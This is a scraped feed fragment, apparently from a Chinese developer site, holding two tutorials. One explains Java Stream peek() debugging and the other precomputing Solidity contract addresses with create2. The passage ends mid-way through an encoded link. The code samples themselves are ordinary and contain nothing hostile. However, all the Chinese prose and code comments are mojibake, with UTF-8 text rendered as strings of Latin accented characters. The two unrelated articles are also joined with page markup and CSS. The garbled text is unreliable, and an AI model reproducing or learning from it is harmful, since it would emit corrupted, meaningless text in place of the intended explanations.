<li>IDE è·³è½¬è°ƒè¯•æ—¶å¸¸å¸¸è¿›å…¥ <code>Stream</code> çš„åº•å±‚å®ç°ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬çš„ <code>lambda</code> è¡¨è¾¾å¼</li>
</ul>
<p>ğŸ“Œ æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªâ€œè§‚å¯Ÿçª—å£â€ â€”â€” <code>peek()</code>ã€‚</p>
<hr/>
<h3 data-id="heading-3">ğŸ” <code>peek()</code> æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><code>peek()</code> æ˜¯ Stream API ä¸­çš„ä¸€ä¸ª<strong>ä¸­é—´æ“ä½œ</strong>ï¼Œå¯ä»¥è®©æˆ‘ä»¬â€œå·çœ‹â€æµä¸­å…ƒç´ åœ¨æ¯ä¸ªé˜¶æ®µçš„çŠ¶æ€ã€‚</p>
<p>ğŸ“˜ æ–¹æ³•ç­¾åï¼š</p>
<pre><code class="hljs language-java" lang="java">Stream&lt;T&gt; <span class="hljs-title function_">peek</span><span class="hljs-params">(Consumer&lt;? <span class="hljs-built_in">super</span> T&gt; action)</span>
</code></pre>
<ul>
<li>å®ƒæ¥æ”¶ä¸€ä¸ª <code>Consumer</code>ï¼ˆæ¯”å¦‚ <code>System.out::println</code>ï¼‰</li>
<li>ä¼šåœ¨æ¯ä¸ªå…ƒç´ è¢«å¤„ç†æ—¶è°ƒç”¨è¯¥ consumer</li>
<li>ä¸ä¼šæ”¹å˜å…ƒç´ æœ¬èº«ï¼</li>
</ul>
<hr/>
<h3 data-id="heading-4">âš ï¸ ä½¿ç”¨å»ºè®®</h3>
<blockquote>
<p>â˜¢ï¸ <code>peek()</code> ä»…é€‚ç”¨äºè°ƒè¯•ï¼ä¸è¦ç”¨å®ƒå»ä¿®æ”¹å…ƒç´ æˆ–æ‰§è¡Œå‰¯ä½œç”¨æ“ä½œã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">ğŸ”¨ ç¤ºä¾‹ä»£ç </h3>
<pre><code class="hljs language-java" lang="java">List&lt;String&gt; strings = List.of(<span class="hljs-string">"one"</span>, <span class="hljs-string">"two"</span>, <span class="hljs-string">"three"</span>, <span class="hljs-string">"four"</span>);

List&lt;String&gt; result = strings.stream()
    .peek(s -&gt; System.out.println(<span class="hljs-string">"Starting with = "</span> + s))        <span class="hljs-comment">// é˜¶æ®µ 1ï¼šè¾“å…¥æµ</span>
    .filter(s -&gt; s.startsWith(<span class="hljs-string">"t"</span>))                                <span class="hljs-comment">// é˜¶æ®µ 2ï¼šè¿‡æ»¤é¦–å­—æ¯æ˜¯ "t"</span>
    .peek(s -&gt; System.out.println(<span class="hljs-string">"Filtered = "</span> + s))              <span class="hljs-comment">// é˜¶æ®µ 3ï¼šé€šè¿‡è¿‡æ»¤åçš„</span>
    .map(String::toUpperCase)                                      <span class="hljs-comment">// é˜¶æ®µ 4ï¼šè½¬å¤§å†™</span>
    .peek(s -&gt; System.out.println(<span class="hljs-string">"Mapped = "</span> + s))                <span class="hljs-comment">// é˜¶æ®µ 5ï¼šæ˜ å°„ç»“æœ</span>
    .toList();

System.out.println(<span class="hljs-string">"result = "</span> + result);
</code></pre>
<hr/>
<h3 data-id="heading-6">ğŸ–¨ï¸ æ§åˆ¶å°è¾“å‡ºï¼š</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Starting</span> <span class="hljs-variable">with</span> <span class="hljs-operator">=</span> one
<span class="hljs-type">Starting</span> <span class="hljs-variable">with</span> <span class="hljs-operator">=</span> <span class="hljs-type">two</span>
<span class="hljs-variable">Filtered</span> <span class="hljs-operator">=</span> <span class="hljs-type">two</span>
<span class="hljs-variable">Mapped</span> <span class="hljs-operator">=</span> TWO
<span class="hljs-type">Starting</span> <span class="hljs-variable">with</span> <span class="hljs-operator">=</span> <span class="hljs-type">three</span>
<span class="hljs-variable">Filtered</span> <span class="hljs-operator">=</span> <span class="hljs-type">three</span>
<span class="hljs-variable">Mapped</span> <span class="hljs-operator">=</span> THREE
<span class="hljs-type">Starting</span> <span class="hljs-variable">with</span> <span class="hljs-operator">=</span> <span class="hljs-type">four</span>
<span class="hljs-variable">result</span> <span class="hljs-operator">=</span> [TWO, THREE]
</code></pre>
<hr/>
<h3 data-id="heading-7">ğŸ§  åˆ†æè¾“å‡ºè¿‡ç¨‹</h3>
<p>è®©æˆ‘ä»¬ä¸€æ¡ä¸€æ¡åˆ†æä¸Šé¢æ˜¯å¦‚ä½•æ‰“å°å‡ºæ¥çš„ï¼š</p>

























<table><thead><tr><th>å…ƒç´ </th><th>è¾“å‡ºè¿‡ç¨‹</th></tr></thead><tbody><tr><td><code>one</code></td><td>æ‰“å° <code>Starting with = one</code> â†’ è¢« <code>filter()</code> æ’é™¤ï¼Œæ²¡å†å¤„ç†</td></tr><tr><td><code>two</code></td><td>æ‰“å° <code>Starting with = two</code> â†’ é€šè¿‡è¿‡æ»¤ â†’ æ‰“å° <code>Filtered = two</code> â†’ è½¬å¤§å†™ â†’ æ‰“å° <code>Mapped = TWO</code></td></tr><tr><td><code>three</code></td><td>ç±»ä¼¼ two æµç¨‹</td></tr><tr><td><code>four</code></td><td>æ‰“å° <code>Starting with = four</code> â†’ è¢«è¿‡æ»¤æ‰ï¼Œæµç¨‹ç»ˆæ­¢</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">ğŸ§­ peek() å’Œ Stream æ‰§è¡Œé¡ºåºçš„å¯ç¤º</h3>
<p>é€šè¿‡ <code>peek()</code>ï¼Œä½ å¯ä»¥<strong>éå¸¸ç›´è§‚åœ°çœ‹åˆ°æµæ˜¯å¦‚ä½•â€œæ‡’åŠ è½½ã€å•å…ƒç´ é€ä¸ªå¤„ç†â€çš„</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªå…ƒç´ æ˜¯<strong>ä¸€æ­¥æ­¥å®Œæ•´èµ°å®Œæµæ°´çº¿</strong>ï¼ˆ<code>filter â†’ map â†’ collect</code>ï¼‰</li>
<li>ç„¶åå†å¤„ç†ä¸‹ä¸€ä¸ªå…ƒç´ </li>
<li>ä¸æ˜¯å…ˆå…¨éƒ¨è¿‡æ»¤ã€å†å…¨éƒ¨æ˜ å°„ã€å†å…¨éƒ¨æ”¶é›†ï¼âŒ</li>
</ul>
<p>è¿™å°±æ˜¯<strong>æµå¼å¤„ç†çš„æœ¬è´¨</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-9">âŒ é”™è¯¯ç”¨æ³•ä¸¾ä¾‹</h3>
<pre><code class="hljs language-java" lang="java">stream.peek(s -&gt; database.save(s)) <span class="hljs-comment">// âŒ åƒä¸‡ä¸è¦ç”¨ peek æ‰§è¡Œä¸šåŠ¡æ“ä½œ</span>
</code></pre>
<p>åŸå› ï¼š</p>
<ul>
<li>peek æ˜¯<strong>è°ƒè¯•å·¥å…·</strong>ï¼Œä¸ä¿è¯ä¸€å®šä¼šè¢«è°ƒç”¨ï¼ˆæ¯”å¦‚æµç»ˆæ­¢å‰çŸ­è·¯æ“ä½œï¼‰</li>
<li>peek ä¸æ˜¯å‰¯ä½œç”¨æ‰§è¡Œçš„å®‰å…¨ä½ç½®</li>
<li>ç”¨ <code>forEach()</code> æˆ–å…¶ä»–æ˜¾å¼ç»ˆç«¯æ“ä½œæ›¿ä»£æ›´åˆé€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">ğŸ¯ å®æˆ˜å»ºè®®</h3>





























<table><thead><tr><th>åœºæ™¯</th><th>æ˜¯å¦ä½¿ç”¨ peek()</th></tr></thead><tbody><tr><td>æƒ³è°ƒè¯•æ¯ä¸€æ­¥ä¸­é—´å¤„ç†ç»“æœ</td><td>âœ…</td></tr><tr><td>æƒ³æ‰“å°è¿‡æ»¤ã€æ˜ å°„çš„è¿‡ç¨‹</td><td>âœ…</td></tr><tr><td>æƒ³æ‰§è¡Œæ—¥å¿—è®°å½•æˆ–æµ‹è¯•è°ƒè¯•æ‰“å°</td><td>âœ…ï¼ˆè°ƒè¯•ç¯å¢ƒï¼‰</td></tr><tr><td>æƒ³ä¿å­˜åˆ°æ•°æ®åº“æˆ–å†™æ–‡ä»¶ç­‰å‰¯ä½œç”¨æ“ä½œ</td><td>âŒ</td></tr><tr><td>ç”¨ peek ä»£æ›¿ mapã€filter é€»è¾‘</td><td>âŒ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-11">ğŸ§ª æ‹“å±•ç»ƒä¹ ï¼šæ•°å€¼æµè°ƒè¯•</h3>
<pre><code class="hljs language-java" lang="java">List&lt;Integer&gt; numbers = List.of(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>);

List&lt;Integer&gt; evens = numbers.stream()
    .peek(n -&gt; System.out.println(<span class="hljs-string">"Original = "</span> + n))
    .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)
    .peek(n -&gt; System.out.println(<span class="hljs-string">"Even = "</span> + n))
    .map(n -&gt; n * n)
    .peek(n -&gt; System.out.println(<span class="hljs-string">"Squared = "</span> + n))
    .toList();

System.out.println(<span class="hljs-string">"evens squared = "</span> + evens);
</code></pre>
<hr/>
<h3 data-id="heading-12">ğŸ§© å°ç»“</h3>
<ul>
<li><code>peek()</code> æ˜¯ Stream çš„è°ƒè¯•â€œæœ›è¿œé•œâ€ï¼Œç”¨æ¥æŸ¥çœ‹å…ƒç´ åœ¨æµä¸­çš„å˜åŒ–è·¯å¾„</li>
<li>ä¸è¦åœ¨ç”Ÿäº§ä»£ç ä¸­åšå‰¯ä½œç”¨æ“ä½œ</li>
<li>å®ƒå¯ä»¥å¸®ä½ ç†è§£ Stream çš„æ‰§è¡Œé¡ºåºä¸â€œæ‡’åŠ è½½â€çš„æ‰§è¡Œæ¨¡å‹</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3åˆ†é’ŸSolidity: 9.3 é€šè¿‡ Create2 é¢„è®¡ç®—åˆçº¦åœ°å€]]></title>    <link>https://juejin.cn/post/7589920884310245402</link>    <guid>https://juejin.cn/post/7589920884310245402</guid>    <pubDate>2026-01-02T00:54:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920884310245402" data-draft-id="7589908657682661426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3åˆ†é’ŸSolidity: 9.3 é€šè¿‡ Create2 é¢„è®¡ç®—åˆçº¦åœ°å€"/> <meta itemprop="keywords" content="Solidity,web3,æ™ºèƒ½åˆçº¦"/> <meta itemprop="datePublished" content="2026-01-02T00:54:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3åˆ†é’ŸSolidity: 9.3 é€šè¿‡ Create2 é¢„è®¡ç®—åˆçº¦åœ°å€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T00:54:31.000Z" title="Fri Jan 02 2026 00:54:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æ¬¢è¿è®¢é˜…ä¸“æ </strong>ï¼š<a href="https://juejin.cn/column/7578762210285977663" title="https://juejin.cn/column/7578762210285977663" target="_blank">3åˆ†é’ŸSolidity--æ™ºèƒ½åˆçº¦--Web3åŒºå—é“¾æŠ€æœ¯å¿…å­¦</a></p>
<p>å¦‚éœ€è·å–æœ¬å†…å®¹çš„æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å‚è§ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cyfrin.io%2Fglossary%2Fprecompute-contract-address-with-create2-solidity-code-example" target="_blank" title="https://www.cyfrin.io/glossary/precompute-contract-address-with-create2-solidity-code-example" ref="nofollow noopener noreferrer">Cyfrin.io ä¸Šçš„ Precompute Contract åœ°å€ä¸ Create2ï¼ˆä»£ç ç¤ºä¾‹ï¼‰</a></p>
<p>åˆçº¦åœ°å€å¯ä»¥åœ¨åˆçº¦éƒ¨ç½²å‰é€šè¿‡<code>create2</code>é¢„å…ˆè®¡ç®—å‡ºæ¥</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.26</span>;

contract Factory {
    <span class="hljs-comment">// è¿”å›æ–°éƒ¨ç½²åˆçº¦çš„åœ°å€</span>
    function <span class="hljs-built_in">deploy</span>(address _owner, uint256 _foo, bytes32 _salt)
        public
        payable
        returns (address)
    {
        <span class="hljs-comment">// è¿™ç§è¯­æ³•æ˜¯ä¸€ç§æ— éœ€æ±‡ç¼–å³å¯è°ƒç”¨ create2 çš„æ–°æ–¹æ³•ï¼Œä½ åªéœ€è¦ä¼ é€’ salt å‚æ•°ã€‚</span>
        <span class="hljs-comment">// https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2</span>
        return <span class="hljs-selector-tag">address</span>(new TestContract{salt: _salt}(_owner, _foo));
    }
}

<span class="hljs-comment">// è¿™æ˜¯ä½¿ç”¨æ±‡ç¼–è¯­è¨€çš„æ—§æ–¹æ³•</span>
contract FactoryAssembly {
    event <span class="hljs-built_in">Deployed</span>(address addr, uint256 salt);

    <span class="hljs-comment">// 1.  è·å–å¾…éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç </span>
    <span class="hljs-comment">// æ³¨æ„ï¼š_owner å’Œ _foo æ˜¯ TestContract æ„é€ å‡½æ•°çš„å‚æ•°</span>
    function <span class="hljs-built_in">getBytecode</span>(address _owner, uint256 _foo)
        public
        pure
        returns (bytes memory)
    {
        bytes memory bytecode = <span class="hljs-built_in">type</span>(TestContract)<span class="hljs-selector-class">.creationCode</span>;

        return abi<span class="hljs-selector-class">.encodePacked</span>(bytecode, abi.encode(_owner, _foo));
    }

    <span class="hljs-comment">// 2.  è®¡ç®—è¦éƒ¨ç½²çš„åˆçº¦åœ°å€</span>
    <span class="hljs-comment">//æ³¨æ„ï¼š_saltæ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨äºç”Ÿæˆåœ°å€ã€‚</span>
    function <span class="hljs-built_in">getAddress</span>(bytes memory bytecode, uint256 _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = <span class="hljs-built_in">keccak256</span>(
            abi.encodePacked(
                bytes1(<span class="hljs-number">0</span>xff), <span class="hljs-selector-tag">address</span>(this), _salt, <span class="hljs-built_in">keccak256</span>(bytecode)
            )
        );

        <span class="hljs-comment">// æ³¨æ„ï¼šå°†å“ˆå¸Œçš„æœ€å20ä¸ªå­—èŠ‚è½¬æ¢ä¸ºåœ°å€</span>
        return <span class="hljs-selector-tag">address</span>(uint160(uint256(hash)));
    }

    <span class="hljs-comment">// 3. éƒ¨ç½²åˆçº¦</span>
    <span class="hljs-comment">// æ³¨æ„ï¼š</span>
    <span class="hljs-comment">// æ£€æŸ¥äº‹ä»¶æ—¥å¿— Deployedï¼Œå…¶ä¸­åŒ…å«å·²éƒ¨ç½²çš„ TestContract çš„åœ°å€ã€‚</span>
    <span class="hljs-comment">// æ—¥å¿—ä¸­çš„åœ°å€åº”ä¸ä¸Šè¿°è®¡ç®—çš„åœ°å€ä¸€è‡´ã€‚</span>
    function <span class="hljs-built_in">deploy</span>(bytes memory bytecode, uint256 _salt) public payable {
        <span class="hljs-selector-tag">address</span> addr;

        <span class="hljs-comment">/*
        æ³¨æ„ï¼šå¦‚ä½•è°ƒç”¨create2
        create2(v, p, n, s)
        åœ¨å†…å­˜ä½ç½®påˆ°p + nå¤„åˆ›å»ºæ–°åˆçº¦ä»£ç 
        å¹¶å‘é€v wei
        è¿”å›æ–°åœ°å€
        å…¶ä¸­æ–°åœ°å€ = keccak256(0xff + address(this) + s + keccak256(mem[pâ€¦(p+n)))çš„å‰20å­—èŠ‚
        s = å¤§ç«¯åº256ä½å€¼
        */</span>
        assembly {
            addr :=
                <span class="hljs-built_in">create2</span>(
                    <span class="hljs-built_in">callvalue</span>(), // å½“å‰è°ƒç”¨ä¸­å‘é€çš„wei
                    // è·³è¿‡å‰<span class="hljs-number">32</span>å­—èŠ‚åå¼€å§‹å®é™…ä»£ç 
                    <span class="hljs-built_in">add</span>(bytecode, <span class="hljs-number">0</span>x20),
                    <span class="hljs-built_in">mload</span>(bytecode), // åŠ è½½å‰<span class="hljs-number">32</span>å­—èŠ‚ä¸­åŒ…å«çš„ä»£ç å¤§å°
                    _salt // æ¥è‡ªå‡½æ•°å‚æ•°çš„ç›
                )

            if <span class="hljs-built_in">iszero</span>(<span class="hljs-built_in">extcodesize</span>(addr)) { <span class="hljs-built_in">revert</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>) }
        }

        emit <span class="hljs-built_in">Deployed</span>(addr, _salt);
    }
}

contract TestContract {
    <span class="hljs-selector-tag">address</span> public owner;
    uint256 public foo;

    <span class="hljs-built_in">constructor</span>(address _owner, uint256 _foo) payable {
        owner = _owner;
        foo = _foo;
    }

    function <span class="hljs-built_in">getBalance</span>() public view returns (uint256) {
        return <span class="hljs-selector-tag">address</span>(this)<span class="hljs-selector-class">.balance</span>;
    }
}
</code></pre>
<p>Remix Lite å°è¯•ä¸€ä¸‹</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.byteatatime.dev%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmNvbnRyYWN0IEZhY3RvcnkgewogICAgLy8gUmV0dXJucyB0aGUgYWRkcmVzcyBvZiB0aGUgbmV3bHkgZGVwbG95ZWQgY29udHJhY3QKICAgIGZ1bmN0aW9uIGRlcGxveShhZGRyZXNzIF9vd25lciwgdWludDI1NiBfZm9vLCBieXRlczMyIF9zYWx0KQogICAgICAgIHB1YmxpYwogICAgICAgIHBheWFibGUKICAgICAgICByZXR1cm5zIChhZGRyZXNzKQogICAgewogICAgICAgIC8vIFRoaXMgc3ludGF4IGlzIGEgbmV3ZXIgd2F5IHRvIGludm9rZSBjcmVhdGUyIHdpdGhvdXQgYXNzZW1ibHksIHlvdSBqdXN0IG5lZWQgdG8gcGFzcyBzYWx0CiAgICAgICAgLy8gaHR0cHM6Ly9kb2NzLnNvbGlkaXR5bGFuZy5vcmcvZW4vbGF0ZXN0L2NvbnRyb2wtc3RydWN0dXJlcy5odG1sI3NhbHRlZC1jb250cmFjdC1jcmVhdGlvbnMtY3JlYXRlMgogICAgICAgIHJldHVybiBhZGRyZXNzKG5ldyBUZXN0Q29udHJhY3R7c2FsdDogX3NhbHR9KF9vd25lciwgX2ZvbykpOwogICAgfQp9CgovLyBUaGlzIGlzIHRoZSBvbGRlciB3YXkgb2YgZG9pbmcgaXQgdXNpbmcgYXNzZW1ibHkKY29udHJhY3QgRmFjdG9yeUFzc2VtYmx5IHsKICAgIGV2ZW50IERlcGxveWVkKGFkZHJlc3MgYWRkciwgdWludDI1NiBzYWx0KTsKCiAgICAvLyAxLiBHZXQgYnl0ZWNvZGUgb2YgY29udHJhY3QgdG8gYmUgZGVwbG95ZWQKICAgIC8vIE5PVEU6IF9vd25lciBhbmQgX2ZvbyBhcmUgYXJndW1lbnRzIG9mIHRoZSBUZXN0Q29udHJhY3QncyBjb25zdHJ1Y3RvcgogICAgZnVuY3Rpb24gZ2V0Qnl0ZWNvZGUoYWRkcmVzcyBfb3duZXIsIHVpbnQyNTYgX2ZvbykKICAgICAgICBwdWJsaWMKICAgICAgICBwdXJlCiAgICAgICAgcmV0dXJucyAoYnl0ZXMgbWVtb3J5KQogICAgewogICAgICAgIGJ5dGVzIG1lbW9yeSBieXRlY29kZSA9IHR5cGUoVGVzdENvbnRyYWN0KS5jcmVhdGlvbkNvZGU7CgogICAgICAgIHJldHVybiBhYmkuZW5jb2RlUGFja2VkKGJ5dGVjb2RlLCBhYmkuZW5jb2RlKF9vd25lciwgX2ZvbykpOwogICAgfQoKICAgIC8vIDIuIENvbXB1dGUgdGhlIGFkZHJlc3Mgb2YgdGhlIGNvbnRyYWN0IHRvIGJlIGRlcGxveWVkCiAgICAvLyBOT1RFOiBfc2FsdCBpcyBhIHJhbmRvbSBudW1iZXIgdXNlZCB0byBjcmVhdGUgYW4gYWRkcmVzcwogICAgZnVuY3Rpb24gZ2V0QWRkcmVzcyhieXRlcyBtZW1vcnkgYnl0ZWNvZGUsIHVpbnQyNTYgX3NhbHQpCiAgICAgICAgcHVibGljCiAgICAgICAgdmlldwogICAgICAgIHJldHVybnMgKGFkZHJlc3MpCiAgICB7CiAgICAgICAgYnl0ZXMzMiBoYXNoID0ga2VjY2FrMjU2KAogICAgICAgICAgICBhYmkuZW5jb2RlUGFja2VkKAogICAgICAgICAgICAgICAgYnl0ZXMxKDB4ZmYpLCBhZGRyZXNzKHRoaXMpLCBfc2FsdCwga2VjY2FrMjU2KGJ5dGVjb2RlKQogICAgICAgICAgICApCiAgICAgICAgKTsKCiAgICAgICAgLy8gTk9URTogY2FzdCBsYXN0IDIwIGJ5dGVzIG9mIGhhc2ggdG8gYWRkcmVzcwogICAgICAgIHJldHVybiBhZGRyZXNzKHVpbnQxNjAodWludDI1NihoYXNoKSkpOwogICAgfQoKICAgIC8vIDMuIERlcGxveSB0aGUgY29udHJhY3QKICAgIC8vIE5PVEU6CiAgICAvLyBDaGVjayB0aGUgZXZlbnQgbG9nIERlcGxveWVkIHdoaWNoIGNvbnRhaW5zIHRoZSBhZGRyZXNzIG9mIHRoZSBkZXBsb3llZCBUZXN0Q29udHJhY3QuCiAgICAvLyBUaGUgYWRkcmVzcyBpbiB0aGUgbG9nIHNob3VsZCBlcXVhbCB0aGUgYWRkcmVzcyBjb21wdXRlZCBmcm9tIGFib3ZlLgogICAgZnVuY3Rpb24gZGVwbG95KGJ5dGVzIG1lbW9yeSBieXRlY29kZSwgdWludDI1NiBfc2FsdCkgcHVibGljIHBheWFibGUgewogICAgICAgIGFkZHJlc3MgYWRkcjsKCiAgICAgICAgLyoKICAgICAgICBOT1RFOiBIb3cgdG8gY2FsbCBjcmVhdGUyCgogICAgICAgIGNyZWF0ZTIodiwgcCwgbiwgcykKICAgICAgICBjcmVhdGUgbmV3IGNvbnRyYWN0IHdpdGggY29kZSBhdCBtZW1vcnkgcCB0byBwICsgbgogICAgICAgIGFuZCBzZW5kIHYgd2VpCiAgICAgICAgYW5kIHJldHVybiB0aGUgbmV3IGFkZHJlc3MKICAgICAgICB3aGVyZSBuZXcgYWRkcmVzcyA9IGZpcnN0IDIwIGJ5dGVzIG9mIGtlY2NhazI1NigweGZmICsgYWRkcmVzcyh0aGlzKSArIHMgKyBrZWNjYWsyNTYobWVtW3DigKYocCtuKSkpCiAgICAgICAgICAgICAgcyA9IGJpZy1lbmRpYW4gMjU2LWJpdCB2YWx1ZQogICAgICAgICovCiAgICAgICAgYXNzZW1ibHkgewogICAgICAgICAgICBhZGRyIDo9CiAgICAgICAgICAgICAgICBjcmVhdGUyKAogICAgICAgICAgICAgICAgICAgIGNhbGx2YWx1ZSgpLCAvLyB3ZWkgc2VudCB3aXRoIGN1cnJlbnQgY2FsbAogICAgICAgICAgICAgICAgICAgIC8vIEFjdHVhbCBjb2RlIH